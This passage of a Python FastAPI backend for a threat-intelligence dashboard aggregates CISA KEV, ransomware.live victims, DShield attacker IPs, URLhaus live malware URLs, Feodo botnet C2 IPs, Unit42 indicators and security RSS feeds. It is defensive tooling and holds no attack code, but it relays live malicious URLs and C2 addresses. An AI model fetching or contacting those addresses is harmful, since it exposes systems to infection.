    """CISA KEV feed. Caps to 50 items by default (bounded via `?limit=`,
    hard max 500) — sending the full 1600+ entry catalog is unnecessary
    and adds 400KB+ to every page load."""
    limit = max(1, min(int(limit), 500))
    now = datetime.now(timezone.utc)
    if _feed_cache["data"] and _feed_cache["ts"] and (now - _feed_cache["ts"]) < timedelta(minutes=5):
        cached = _feed_cache["data"]
        return {**cached, "returned": min(limit, len(cached.get("items", []))), "items": cached["items"][:limit]}
    try:
        async with httpx.AsyncClient(timeout=15) as hc:
            r = await hc.get(CISA_FEED_URL)
            r.raise_for_status()
            raw = r.json()
        vulns = raw.get("vulnerabilities", [])
        vulns_sorted = sorted(vulns, key=lambda v: v.get("dateAdded", ""), reverse=True)
        recent = [
            {
                "cve": v.get("cveID"),
                "vendor": v.get("vendorProject"),
                "product": v.get("product"),
                "name": v.get("vulnerabilityName"),
                "dateAdded": v.get("dateAdded"),
                "action": v.get("requiredAction"),
                "ransomware": v.get("knownRansomwareCampaignUse", "Unknown"),
                "nvd_url": f"https://nvd.nist.gov/vuln/detail/{v.get('cveID')}",
                "detail_url": f"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext={v.get('cveID')}",
            }
            for v in vulns_sorted
        ]
        # Cache the FULL sorted feed once; slice per-request. Prevents a re-fetch
        # every time the frontend asks for a different page size.
        full = {
            "source": "CISA Known Exploited Vulnerabilities",
            "catalog_version": raw.get("catalogVersion"),
            "total_count": raw.get("count", len(vulns)),
            "ransomware_linked": sum(1 for v in vulns if v.get("knownRansomwareCampaignUse") == "Known"),
            "updated": now.isoformat(),
            "items": recent,
        }
        _feed_cache["data"] = full
        _feed_cache["ts"] = now
        return {**full, "returned": min(limit, len(recent)), "items": recent[:limit]}
    except Exception as e:
        logger.error(f"Live feed error: {e}")
        if _feed_cache["data"]:
            cached = _feed_cache["data"]
            return {**cached, "returned": min(limit, len(cached.get("items", []))), "items": cached["items"][:limit]}
        raise HTTPException(status_code=502, detail="Unable to reach live threat feed")


_attack_cache: dict[str, Any] = {"ts": None, "data": None}


@api_router.get("/attack-feed")
async def attack_feed():
    """Real-time attack feed: recent ransomware victims from ransomware.live (cached 20 min)."""
    now = datetime.now(timezone.utc)
    if _attack_cache["data"] and _attack_cache["ts"] and (now - _attack_cache["ts"]) < timedelta(minutes=5):
        return _attack_cache["data"]
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as hc:
            r = await hc.get("https://api.ransomware.live/v2/recentvictims")
            r.raise_for_status()
            raw = r.json()
        items = []
        for v in raw[:200]:  # ransomware.live returns ~100 items; keep 200 as safety cap
            items.append({
                "victim": v.get("victim"),
                "group": v.get("group"),
                "country": v.get("country"),
                "sector": v.get("activity") if v.get("activity") not in (None, "Not Found") else None,
                "domain": v.get("domain"),
                "date": v.get("attackdate") or v.get("discovered"),
                "screenshot": v.get("screenshot"),
                "url": v.get("url"),
            })
        result = {
            "source": "ransomware.live · Recent Victims",
            "updated": now.isoformat(),
            "count": len(items),
            "items": items,
        }
        _attack_cache["data"] = result
        _attack_cache["ts"] = now
        return result
    except Exception as e:
        logger.error(f"Attack feed error: {e}")
        if _attack_cache["data"]:
            return _attack_cache["data"]
        raise HTTPException(status_code=502, detail="Unable to reach live attack feed")


# ---------------------------------------------------------------------------
# Live global attacks aggregate — merges public honeypot + malware-distribution
# feeds (SANS DShield top attackers, URLhaus recent malware URLs, Feodo Tracker
# botnet C2s) into a single "who's attacking the internet right now" payload.
# All feeds are public / free / no key required. Cached 5 min.
# ---------------------------------------------------------------------------
_live_attacks_cache: dict[str, Any] = {"ts": None, "data": None}


@api_router.get("/live-attacks")
async def live_attacks():
    """Real-time global attack telemetry from public honeypot + malware feeds:
    SANS DShield (top attacker IPs), URLhaus (live malware URLs), Feodo Tracker
    (botnet C2s). Cached 5 min, source-attributed, no proprietary data."""
    now = datetime.now(timezone.utc)
    if _live_attacks_cache["data"] and _live_attacks_cache["ts"] and (now - _live_attacks_cache["ts"]) < timedelta(minutes=5):
        return _live_attacks_cache["data"]

    attackers: list[dict] = []
    malicious_urls: list[dict] = []
    botnet_c2s: list[dict] = []
    errors: list[str] = []

    async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers={"User-Agent": "NivX-ThreatMap/1.0"}) as hc:
        # 1) SANS DShield top attacker IPs (last 24h)
        try:
            r = await hc.get("https://isc.sans.edu/api/topips/records/50/?json")
            if r.status_code == 200:
                for it in (r.json() or [])[:50]:
                    if not it.get("source"):
                        continue
                    attackers.append({
                        "rank": it.get("rank"),
                        "ip": it.get("source"),
                        "reports": int(it.get("reports") or 0),
                        "targets": int(it.get("targets") or 0),
                        "source_name": "SANS Internet Storm Center · DShield",
                    })
            else:
                errors.append(f"DShield HTTP {r.status_code}")
        except Exception as e:
            errors.append(f"DShield: {e}")

        # 2) URLhaus recent malware distribution URLs
        try:
            r = await hc.get("https://urlhaus.abuse.ch/downloads/json_recent/")
            if r.status_code == 200:
                raw = r.json() or {}
                iterable = raw.values() if isinstance(raw, dict) else raw
                for entry in list(iterable)[:80]:
                    e = entry[0] if isinstance(entry, list) else entry
                    if not e or not e.get("url"):
                        continue
                    malicious_urls.append({
                        "url": e.get("url"),
                        "threat": e.get("threat") or "malware_download",
                        "status": e.get("url_status") or "online",
                        "tags": (e.get("tags") or [])[:5],
                        "reporter": e.get("reporter") or "urlhaus",
                        "first_seen": e.get("dateadded"),
                        "urlhaus_link": e.get("urlhaus_link"),
                        "source_name": "URLhaus (abuse.ch)",
                    })
            else:
                errors.append(f"URLhaus HTTP {r.status_code}")
        except Exception as e:
            errors.append(f"URLhaus: {e}")

        # 3) Feodo Tracker aggressive botnet C2 IPs
        try:
            r = await hc.get("https://feodotracker.abuse.ch/downloads/ipblocklist_aggressive.txt")
            if r.status_code == 200:
                for line in r.text.splitlines()[:100]:
                    s = line.strip()
                    if not s or s.startswith("#"):
                        continue
                    if _classify_ioc(s) == "ip":
                        botnet_c2s.append({"ip": s, "source_name": "Feodo Tracker (abuse.ch)"})
            else:
                errors.append(f"Feodo HTTP {r.status_code}")
        except Exception as e:
            errors.append(f"Feodo: {e}")

    result = {
        "updated_at": now.isoformat(),
        "sources": [
            {"name": "SANS DShield", "url": "https://isc.sans.edu/", "count": len(attackers)},
            {"name": "URLhaus (abuse.ch)", "url": "https://urlhaus.abuse.ch/", "count": len(malicious_urls)},
            {"name": "Feodo Tracker (abuse.ch)", "url": "https://feodotracker.abuse.ch/", "count": len(botnet_c2s)},
        ],
        "attackers": attackers,
        "malicious_urls": malicious_urls,
        "botnet_c2s": botnet_c2s[:50],
        "counts": {"attackers": len(attackers), "malicious_urls": len(malicious_urls), "botnet_c2s": len(botnet_c2s)},
        "errors": errors,
    }
    _live_attacks_cache["data"] = result
    _live_attacks_cache["ts"] = now
    return result


# ---------------------------------------------------------------------------
# Real-time Threat Landscape aggregate — powers the "Threat landscape, right now"
# dashboard on the marketing landing. Aggregates fresh CISA KEV + ransomware.live
# + the curated IOC DB + last-sync timestamps into a single payload that the
# frontend polls every 30 seconds.
# ---------------------------------------------------------------------------
def _parse_victim_dt(v: dict) -> Optional[datetime]:
    for key in ("attackdate", "discovered", "date", "published"):
        raw = v.get(key)
        if not raw:
            continue
        s = str(raw).strip()
        # 1) ISO 8601 with tz (ransomware.live v2 current format): "2026-07-09T13:57:36.957462+00:00"
        try:
            # Python 3.11's fromisoformat handles offsets like +00:00 natively.
            dt = datetime.fromisoformat(s.replace("Z", "+00:00"))
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return dt
        except ValueError:
            pass
        # 2) Legacy formats (fallback for other sources)
        for fmt in ("%Y-%m-%d %H:%M:%S.%f", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d"):
            try:
                return datetime.strptime(s, fmt).replace(tzinfo=timezone.utc)
            except ValueError:
                continue
    return None


@api_router.get("/threat-landscape/live")
async def threat_landscape_live():
    """Real-time aggregate for the landing 'Threat landscape' panel.
    Returns fresh CVE/ransomware/curated-IOC stats + recent activity so the
    UI can render a truly dynamic dashboard (frontend polls every 30s)."""
    now = datetime.now(timezone.utc)

    # --- CISA KEV (uses the same 5-min cache as /live-feed)
    total_cves = 0
    ransomware_linked = 0
    newest_cves: List[dict] = []
    try:
        feed = await live_feed()  # reuses cache
        total_cves = int(feed.get("total_count") or 0)
        ransomware_linked = int(feed.get("ransomware_linked") or 0)
        newest_cves = (feed.get("items") or [])[:6]
    except Exception as e:
        logger.warning(f"landscape/live: CISA fetch failed: {e}")

    # --- Ransomware.live (recent victims, uses 5-min cache)
    victims_24h = 0
    newest_victims: List[dict] = []
    try:
        atk = await attack_feed()
        items = atk.get("items") or []
        cutoff = now - timedelta(hours=24)
        for v in items:
            dt = _parse_victim_dt(v)
            if dt and dt >= cutoff:
                victims_24h += 1
        newest_victims = items[:6]
    except Exception as e:
        logger.warning(f"landscape/live: ransomware.live fetch failed: {e}")

    # --- Curated IOC database (live count + severity split)
    total_iocs = await db.iocs.count_documents({}) or 0
    critical_iocs = await db.iocs.count_documents({"severity": "critical"}) or 0

    # --- Last sync across all sync-meta docs (freshness signal)
    last_synced_at = None
    last_synced_source = None
    try:
        async for doc in db.sync_meta.find({}, {"_id": 1, "synced_at": 1}):
            ts = doc.get("synced_at")
            if ts and (last_synced_at is None or ts > last_synced_at):
                last_synced_at = ts
                last_synced_source = doc.get("_id")
        otx_doc = await db.otx_meta.find_one({"_id": "last_sync"}, {"synced_at": 1})
        if otx_doc and otx_doc.get("synced_at") and (last_synced_at is None or otx_doc["synced_at"] > last_synced_at):
            last_synced_at = otx_doc["synced_at"]
            last_synced_source = "otx"
    except Exception:
        pass

    # --- New CVEs added in the last 7 days (approximate "attack surface velocity")
    cves_last_7d = 0
    try:
        week_cutoff = (now - timedelta(days=7)).date().isoformat()
        for c in newest_cves:
            if (c.get("dateAdded") or "") >= week_cutoff:
                cves_last_7d += 1
        # Extend the count by scanning the full feed (already cached).
        if _feed_cache.get("data"):
            for c in (_feed_cache["data"].get("items") or []):
                if (c.get("dateAdded") or "") >= week_cutoff:
                    cves_last_7d += 1
            # We double-counted the newest set above; subtract it back.
            cves_last_7d -= sum(1 for c in newest_cves if (c.get("dateAdded") or "") >= week_cutoff)
    except Exception:
        pass

    return {
        "updated_at": now.isoformat(),
        "stats": {
            "total_cves": total_cves,
            "ransomware_linked_cves": ransomware_linked,
            "cves_last_7d": max(cves_last_7d, 0),
            "victims_24h": victims_24h,
            "curated_iocs": total_iocs,
            "critical_iocs": critical_iocs,
        },
        "last_synced_at": last_synced_at,
        "last_synced_source": last_synced_source,
        "newest_cves": newest_cves,
        "newest_victims": newest_victims,
    }



# ---------------------------------------------------------------------------
# Unit42 Timely Threat Intel feed (real published intel from Palo Alto GitHub)
# ---------------------------------------------------------------------------
_intel_cache: dict[str, Any] = {"ts": None, "data": None}
UNIT42_REPO = "PaloAltoNetworks/Unit42-timely-threat-intel"

_INTEL_IMAGES = {
    "phishing": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "ransomware": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "rat": "https://images.pexels.com/photos/5473298/pexels-photo-5473298.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "loader": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "scam": "https://images.pexels.com/photos/5380642/pexels-photo-5380642.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "stealer": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "default": "https://images.pexels.com/photos/5483240/pexels-photo-5483240.jpeg?auto=compress&cs=tinysrgb&w=1000",
}


def _pick_intel_image(title: str) -> str:
    t = title.lower()
    for key, url in _INTEL_IMAGES.items():
        if key != "default" and key in t:
            return url
    return _INTEL_IMAGES["default"]


INTEL_TYPES = ["Ransomware", "Phishing", "RAT", "Loader", "Stealer", "Scam", "APT", "Other"]


def _intel_type(title: str) -> str:
    t = title.lower()
    if any(k in t for k in ["ransom", "lockbit", "akira", "blackcat", "alphv", "encrypt"]):
        return "Ransomware"
    if any(k in t for k in ["phish", "smish", "clickfix", "credential"]):
        return "Phishing"
    if any(k in t for k in ["rat", "asyncrat", "remote access", "njrat", "remcos"]):
        return "RAT"
    if any(k in t for k in ["loader", "castleloader", "downloader", "dropper"]):
        return "Loader"
    if any(k in t for k in ["stealer", "infostealer", "lumma", "redline"]):
        return "Stealer"
    if any(k in t for k in ["scam", "fraud", "impersonat"]):
        return "Scam"
    if any(k in t for k in ["apt", "espionage", "state-sponsored", "nation"]):
        return "APT"
    return "Other"


_intel_listing: dict[str, Any] = {"ts": None, "names": None}


async def _get_unit42_listing() -> list:
    now = datetime.now(timezone.utc)
    if _intel_listing["names"] and _intel_listing["ts"] and (now - _intel_listing["ts"]) < timedelta(minutes=60):
        return _intel_listing["names"]
    async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
        listing = await hc.get(f"https://api.github.com/repos/{UNIT42_REPO}/contents/")
        listing.raise_for_status()
        names = sorted([f["name"] for f in listing.json() if f["name"].endswith(".txt")], reverse=True)
    _intel_listing["names"] = names
    _intel_listing["ts"] = now
    return names


def _parse_unit42(name: str, text: str) -> dict:
    date = name[:10]
    title = name[11:-4].replace("-", " ")
    lines = text.splitlines()
    section = None
    notes, refs, indicators, authors = [], [], [], []
    for ln in lines:
        s = ln.strip()
        up = s.upper()
        if up.startswith("NOTES:"):
            section = "notes"
            continue
        if up.startswith("REFERENCES:"):
            section = "refs"
            continue
        if up.startswith("INDICATORS:") or up.startswith("INDICATORS "):
            section = "ind"
            continue
        if up.startswith("AUTHOR:"):
            section = "author"
            continue
        if not s:
            continue
        if section == "notes" and s.startswith("-"):
            notes.append(s.lstrip("- ").strip())
        elif section == "refs" and ("http" in s):
            refs.append(s.lstrip("- ").strip())
        elif section == "author" and s.startswith("-"):
            authors.append(s.lstrip("- ").strip())
        elif section == "ind":
            indicators.append(s)
    summary = " ".join(notes[:2])[:320] if notes else title
    ioc_lines = [i for i in indicators if "[.]" in i or "[:]" in i or "sha256" in i.lower() or "md5" in i.lower()]
    return {
        "name": name,
        "title": title,
        "date": date,
        "type": _intel_type(title),
        "authors": authors,
        "summary": summary,
        "notes": notes,
        "references": refs,
        "indicators": ioc_lines,
        "reference": refs[0] if refs else f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "url": f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "ioc_count": len(ioc_lines),
        "image": _pick_intel_image(title),
        "source": "Palo Alto Unit42",
    }


def _intel_card(full: dict) -> dict:
    """Lightweight card view (drops heavy indicator/notes lists)."""
    return {
        "name": full["name"], "title": full["title"], "date": full["date"], "type": full["type"],
        "summary": full["summary"], "reference": full["reference"], "url": full["url"],
        "ioc_count": full["ioc_count"], "image": full["image"], "source": full["source"],
    }


@api_router.get("/intel-report/{name}")
async def intel_report(name: str):
    """Full parsed Unit42 report for the in-app reader."""
    if not re.match(r"^[0-9A-Za-z._-]+\.txt$", name):
        raise HTTPException(status_code=400, detail="Invalid report name")
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
            resp.raise_for_status()
            full = _parse_unit42(name, resp.text)
        full["indicators"] = full["indicators"][:500]
        return full
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Intel report error for {name}: {e}")
        raise HTTPException(status_code=502, detail="Unable to load report")


@api_router.get("/intel-feed")
async def intel_feed(page: int = 1, page_size: int = 9, q: str = "", type: str = "", since: str = ""):
    """Paginated + filterable Unit42 intel feed. Filters on filename metadata, fetches content per page."""
    page = max(1, page)
    page_size = min(max(1, page_size), 24)
    try:
        names = await _get_unit42_listing()

        def match(name: str) -> bool:
            title = name[11:-4].replace("-", " ")
            date = name[:10]
            if q and q.lower() not in title.lower():
                return False
            if type and _intel_type(title) != type:
                return False
            if since and date < since:
                return False
            return True

        filtered = [n for n in names if match(n)]
        total = len(filtered)
        start = (page - 1) * page_size
        page_names = filtered[start:start + page_size]

        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            async def fetch(name):
                try:
                    resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
                    resp.raise_for_status()
                    return _intel_card(_parse_unit42(name, resp.text))
                except Exception:
                    return _intel_card(_parse_unit42(name, ""))

            items = await asyncio.gather(*[fetch(n) for n in page_names])

        return {
            "source": "Palo Alto Networks · Unit42 Timely Threat Intel",
            "repo_url": f"https://github.com/{UNIT42_REPO}",
            "updated": datetime.now(timezone.utc).isoformat(),
            "types": INTEL_TYPES,
            "total": total,
            "page": page,
            "page_size": page_size,
            "has_more": start + page_size < total,
            "count": len(items),
            "items": list(items),
        }
    except Exception as e:
        logger.error(f"Intel feed error: {e}")
        raise HTTPException(status_code=502, detail="Unable to reach Unit42 intel feed")


# ---------------------------------------------------------------------------
# Community aggregator — returns metadata (title, cover image, short snippet,
# date, source URL) scraped from the CyberDefenders blog. NOTE: this returns
# ONLY metadata/short snippets. Article bodies are NOT reproduced. Card clicks
# on the frontend open the source article on cyberdefenders.org directly.
# ---------------------------------------------------------------------------
_CD_CACHE: dict = {"ts": None, "data": None}
_CD_TTL = timedelta(hours=6)

CD_TOPIC_KEYWORDS = {
    "dfir":    ["forensic", "disk", "memory", "incident", "investigation", "triage", "evidence", "case study", "usb", "bec", "email compromise"],
    "malware": ["malware", "ransomware", "powershell", "encoded", "fileless", "cross-site", "xss", "phishing", "trojan"],
    "soc":     ["soc", "hunt", "detection", "alert", "playbook", "mindset", "hacker mindset", "ids", "intrusion detection", "apt", "persistence", "threat intel", "azure", "cloud security"],
}


def _cd_topic_for(title: str, excerpt: str) -> str:
    text = f"{title} {excerpt}".lower()
    scores = {t: sum(1 for kw in kws if kw in text) for t, kws in CD_TOPIC_KEYWORDS.items()}
    top = max(scores, key=scores.get)
    return top if scores[top] > 0 else "soc"


@api_router.get("/community/cd-articles")
async def community_cd_articles(topic: Optional[str] = None):
    """Public curator endpoint. Returns cyberdefenders.org blog article
    metadata (title, cover, snippet, date, url) grouped by topic. Snippet is
    truncated to <=180 chars (fair-use excerpt). Cached for 6h."""
    now = datetime.now(timezone.utc)
    if _CD_CACHE["data"] and _CD_CACHE["ts"] and (now - _CD_CACHE["ts"]) < _CD_TTL:
        articles = _CD_CACHE["data"]
    else:
        try:
            async with httpx.AsyncClient(timeout=20, follow_redirects=True, headers={"User-Agent": "NivX-Aggregator/1.0"}) as hc:
                r = await hc.get("https://cyberdefenders.org/blog/")
                if r.status_code != 200:
                    raise HTTPException(status_code=502, detail=f"CyberDefenders returned HTTP {r.status_code}")
                html = r.text
        except Exception as e:
            raise HTTPException(status_code=502, detail=f"CyberDefenders fetch failed: {e}")

        # Extract article cards. Each card block links to /blog/<slug>/ and contains
        # a featured image (in /media/blog/featured_images/) + a title + a short paragraph.
        # Extract article cards from the CD blog listing HTML. We only pull metadata
        # (title, cover, ~180-char snippet, date, source URL) — no article bodies.
        articles = []
        seen_slugs: set = set()
        # Each card is anchored by <a href="/blog/<slug>/"> ... </a>
        for m in re.finditer(r'<a[^>]+href="(/blog/([a-z0-9\-]+)/)"[^>]*>(.*?)</a>', html, re.DOTALL):
            path, slug, block = m.group(1), m.group(2), m.group(3)
            if slug in seen_slugs or slug in ("", "feed"):
                continue
            # Skip pagination / non-article links (must contain a card with an <h3>)
            title_m = re.search(r'<h3[^>]*>([^<]+)</h3>', block)
            if not title_m:
                continue
            seen_slugs.add(slug)
            title = re.sub(r"\s+", " ", title_m.group(1).replace("&#x27;", "'").replace("&amp;", "&")).strip()
            img_m = re.search(r'<img[^>]+src="([^"]+)"', block)
            excerpt_m = re.search(r'<p[^>]*line-clamp-3[^>]*>([^<]+)</p>', block)
            excerpt_raw = (excerpt_m.group(1) if excerpt_m else "").strip()
            excerpt = re.sub(r"\s+", " ", excerpt_raw)[:180].rstrip()
            if excerpt and not excerpt.endswith("…"):
                excerpt = excerpt.rstrip(". ") + "…"
            date_m = re.search(r'<time[^>]*>([^<]+)</time>', block)
            cat_m = re.search(r'data-slot="badge"[^>]*>[^<]*</span>[^<]*<span[^>]*>([^<]+)</span>', block) or \
                    re.search(r'<span[^>]*capitalize[^>]*>([^<]+)</span>', block)
            item = {
                "slug": slug,
                "url": "https://cyberdefenders.org" + path,
                "title": title,
                "image": img_m.group(1) if img_m else None,
                "date": date_m.group(1).strip() if date_m else None,
                "category": (cat_m.group(1).strip() if cat_m else "Cybersecurity"),
                "excerpt": excerpt,
                "topic": _cd_topic_for(title, excerpt),
            }
            articles.append(item)
            if len(articles) >= 30:
                break

        _CD_CACHE["ts"] = now
        _CD_CACHE["data"] = articles

    if topic:
        t = topic.lower()
        articles = [a for a in articles if a.get("topic") == t]

    return {
        "source": "cyberdefenders.org/blog",
        "attribution": "Content curated from CyberDefenders. Click 'Read on CyberDefenders' to view the full article on the source site.",
        "count": len(articles),
        "articles": articles,
    }



@api_router.get("/")
async def root():
    return {"message": "NivX Machines API online"}



# ---------------------------------------------------------------------------
# Generic RSS/Atom aggregator — Talos, Unit42, etc. Metadata only (title,
# summary snippet capped at 200 chars, cover image, publish date, source URL).
# Card clicks on the frontend open the source article in a new tab.
# ---------------------------------------------------------------------------
_RSS_CACHE: dict = {}
_RSS_TTL = timedelta(minutes=30)

RSS_SOURCES = {
    "talos":        {"name": "Cisco Talos Intelligence",         "url": "https://blog.talosintelligence.com/rss/",                                                                          "site": "https://blog.talosintelligence.com"},
    "unit42":       {"name": "Palo Alto Unit 42",                 "url": "https://unit42.paloaltonetworks.com/feed/",                                                                        "site": "https://unit42.paloaltonetworks.com"},
    "dfir":         {"name": "The DFIR Report",                   "url": "https://thedfirreport.com/feed/",                                                                                   "site": "https://thedfirreport.com"},
    "msthreat":     {"name": "Microsoft Threat Intelligence",     "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",                                    "site": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/"},
    "bleeping":     {"name": "BleepingComputer",                  "url": "https://www.bleepingcomputer.com/feed/",                                                                            "site": "https://www.bleepingcomputer.com"},
    "hn":           {"name": "Hacker News",                       "url": "https://news.ycombinator.com/rss",                                                                                  "site": "https://news.ycombinator.com"},
    "thn":          {"name": "The Hacker News",                   "url": "https://feeds.feedburner.com/TheHackersNews",                                                                       "site": "https://thehackernews.com"},
    "krebs":        {"name": "Krebs on Security",                 "url": "https://krebsonsecurity.com/feed/",                                                                                 "site": "https://krebsonsecurity.com"},
    "darkreading":  {"name": "Dark Reading",                       "url": "https://www.darkreading.com/rss.xml",                                                                              "site": "https://www.darkreading.com"},
    "securityweek": {"name": "SecurityWeek",                       "url": "https://www.securityweek.com/feed/",                                                                                "site": "https://www.securityweek.com"},
    "therecord":    {"name": "The Record (Recorded Future)",      "url": "https://therecord.media/feed/",                                                                                     "site": "https://therecord.media"},
}


def _clean_text(s: str) -> str:
    """Strip HTML tags and CDATA wrappers, collapse whitespace."""
    if not s:
        return ""
    s = re.sub(r"<!\[CDATA\[(.*?)\]\]>", r"\1", s, flags=re.DOTALL)
    s = re.sub(r"<[^>]+>", " ", s)
    s = s.replace("&amp;", "&").replace("&#8217;", "'").replace("&#8220;", "\u201C").replace("&#8221;", "\u201D").replace("&nbsp;", " ")
    return re.sub(r"\s+", " ", s).strip()


def _parse_rss_feed(xml: str, max_items: int = 15) -> list[dict]:
    """Parse a basic RSS 2.0 or Atom feed into [{slug, url, title, image, date, excerpt}].
    Snippets capped at 200 chars for fair-use aggregation."""
    items: list[dict] = []
    # RSS 2.0 <item>
    for m in re.finditer(r"<item[^>]*>(.*?)</item>", xml, re.DOTALL | re.IGNORECASE):
        block = m.group(1)
        title = _clean_text((re.search(r"<title[^>]*>(.*?)</title>", block, re.DOTALL) or re.match("$^", "")).group(1)) if re.search(r"<title", block) else ""
        link_m = re.search(r"<link[^>]*>(.*?)</link>", block, re.DOTALL)
        link = _clean_text(link_m.group(1)) if link_m else ""
        date_m = re.search(r"<pubDate[^>]*>(.*?)</pubDate>", block, re.DOTALL) or re.search(r"<dc:date[^>]*>(.*?)</dc:date>", block, re.DOTALL)
        date = _clean_text(date_m.group(1)) if date_m else ""
        desc_m = re.search(r"<description[^>]*>(.*?)</description>", block, re.DOTALL) or re.search(r"<content:encoded[^>]*>(.*?)</content:encoded>", block, re.DOTALL)
        desc_html = desc_m.group(1) if desc_m else ""
        img_m = re.search(r'<enclosure[^>]+url="([^"]+)"', block) or re.search(r'<media:content[^>]+url="([^"]+)"', block) or re.search(r'<media:thumbnail[^>]+url="([^"]+)"', block) or re.search(r'<img[^>]+src="([^"]+)"', desc_html or block)
        image = img_m.group(1) if img_m else None
        excerpt = _clean_text(desc_html)[:200].rstrip()
        if excerpt and not excerpt.endswith("…"):
            excerpt = excerpt.rstrip(". ") + "…"
        if title and link:
            slug = link.rstrip("/").split("/")[-1][:80]
            # Prefer human date if parseable.
            display_date = date
            iso_date = None
            try:
                from email.utils import parsedate_to_datetime
                dt = parsedate_to_datetime(date)
                if dt.tzinfo is None:
                    dt = dt.replace(tzinfo=timezone.utc)
                display_date = dt.strftime("%b %-d, %Y")
                iso_date = dt.astimezone(timezone.utc).isoformat()
            except Exception:
                pass
            items.append({"slug": slug or f"item-{len(items)}", "url": link, "title": title, "image": image, "date": display_date, "iso_date": iso_date, "excerpt": excerpt, "category": "Threat Research"})
            if len(items) >= max_items:
                break
    return items


@api_router.get("/community/feed/{source}")
async def community_feed(source: str):
    """Aggregate a single RSS/Atom threat-intel feed as metadata cards.
    Returns title, cover image, ~200-char snippet, date, source URL. Cached 6h."""
    src = RSS_SOURCES.get(source)
    if not src:
        raise HTTPException(status_code=404, detail=f"Unknown source '{source}'. Available: {', '.join(RSS_SOURCES)}")
    now = datetime.now(timezone.utc)
    cached = _RSS_CACHE.get(source)
    if cached and (now - cached["ts"]) < _RSS_TTL:
        articles = cached["data"]
    else:
        try:
            async with httpx.AsyncClient(timeout=20, follow_redirects=True, headers={"User-Agent": "NivX-Aggregator/1.0"}) as hc:
                r = await hc.get(src["url"])
                if r.status_code != 200:
                    raise HTTPException(status_code=502, detail=f"{src['name']} returned HTTP {r.status_code}")
                articles = _parse_rss_feed(r.text, max_items=15)
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=502, detail=f"{src['name']} fetch failed: {e}")
        _RSS_CACHE[source] = {"ts": now, "data": articles}

    return {
        "source": src["name"],
        "site": src["site"],
        "attribution": f"Content curated from {src['name']}. Click any card to read the full article on the source site.",
        "count": len(articles),
        "articles": articles,
    }


@api_router.get("/community/firehose")
async def community_firehose(limit: int = 60):
    """Merged live-firehose feed: pulls every configured RSS source in parallel,
    de-duplicates by URL, sorts by publish date DESC, and returns a single
    unified list. Powers the Blog page's "Live Cyber News" section. Cached
    server-side via the per-source _RSS_CACHE."""
    now = datetime.now(timezone.utc)
    tasks = []
    labels = []
    for slug, src in RSS_SOURCES.items():
        cached = _RSS_CACHE.get(slug)
        if cached and (now - cached["ts"]) < _RSS_TTL:
            tasks.append(asyncio.sleep(0, result=cached["data"]))
            labels.append((slug, src))
            continue

        async def _fetch(slug=slug, src=src):
            try:
                async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers={"User-Agent": "NivX-Aggregator/1.0"}) as hc:
                    r = await hc.get(src["url"])
                    if r.status_code != 200:
                        return []
                    parsed = _parse_rss_feed(r.text, max_items=15)
                    _RSS_CACHE[slug] = {"ts": now, "data": parsed}
                    return parsed
            except Exception:
                return []
        tasks.append(_fetch())
        labels.append((slug, src))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    merged: list[dict] = []
    seen_urls: set[str] = set()
    for (slug, src), items in zip(labels, results):
        if isinstance(items, Exception) or not items:
            continue
        for a in items:
            url = a.get("url")
            if not url or url in seen_urls:
                continue
            seen_urls.add(url)
            merged.append({**a, "source_slug": slug, "source_name": src["name"], "source_site": src["site"]})

    # Sort by parsed date descending (fallback: original list order).
    def _dt(a):
        try:
            return datetime.fromisoformat(str(a.get("iso_date") or "").replace("Z", "+00:00")) if a.get("iso_date") else datetime.min.replace(tzinfo=timezone.utc)
        except Exception:
            return datetime.min.replace(tzinfo=timezone.utc)
    merged.sort(key=_dt, reverse=True)

    return {
        "updated_at": now.isoformat(),
        "sources": [{"slug": s, "name": src["name"], "site": src["site"]} for s, src in RSS_SOURCES.items()],
        "count": min(len(merged), max(1, min(limit, 200))),
        "articles": merged[: max(1, min(limit, 200))],
    }


# ---------------------------------------------------------------------------
# Admin Settings — DB-backed override for API keys + community source toggles.
# DB value wins over .env, so the app can be moved to any server and keys can
# be rotated from the Admin panel without redeploying.
# ---------------------------------------------------------------------------
API_KEY_SETTINGS = [
    {"name": "VIRUSTOTAL_API_KEY",    "label": "VirusTotal",              "get_url": "https://www.virustotal.com/gui/my-apikey",                    "desc": "Reputation for files, hashes, domains, URLs & IPs.",   "global_var": "VT_API_KEY"},
    {"name": "ABUSEIPDB_API_KEY",     "label": "AbuseIPDB",               "get_url": "https://www.abuseipdb.com/account/api",                       "desc": "IP address abuse-confidence scoring.",                 "global_var": "ABUSEIPDB_API_KEY"},
    {"name": "URLSCAN_API_KEY",       "label": "URLScan.io",              "get_url": "https://urlscan.io/user/profile/",                            "desc": "URL sandbox scans + verdict search.",                  "global_var": "URLSCAN_API_KEY"},
